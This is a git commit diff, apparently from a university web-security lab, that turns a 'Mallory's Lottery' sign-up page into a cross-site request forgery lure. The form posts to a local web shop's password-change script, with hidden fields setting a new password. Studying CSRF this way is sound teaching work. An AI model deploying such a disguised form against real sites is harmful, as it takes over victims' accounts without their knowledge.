24fbb55eee27b20244e674767d04fd7fd90aa875
Simon Tenggren <si6187te-s@venus-4.e.lth.lu.se>
2018-10-05 10:02:03 +0200

    CSRF funkar?

--- MallorysLottery/index.php
+++ MallorysLottery/index.php
@@ -3,13 +3,16 @@
 	<?php include 'css/index.css'; ?>
 	</style>
 
-	<title>
+	<title>	
 		WIN! WIN! WIN!
 	</title>
 	<head>Enter e-mail below to enter the lottery!</head>
 	<body>
-  <form action ="" method="get">
+  <form action ="http://127.0.0.1/WebShop/changePass.php" method="post">
     E-mail: <input type = "text" name = "email"><br>
+		<input type="hidden" name="password" value = "NewPassword1"><br>
+		<input type = "hidden" name = "repeatPass" value = "NewPassword1"><br>
+		</form>
     	<input type="submit" value = "Sign up">
   </body>
 </html>
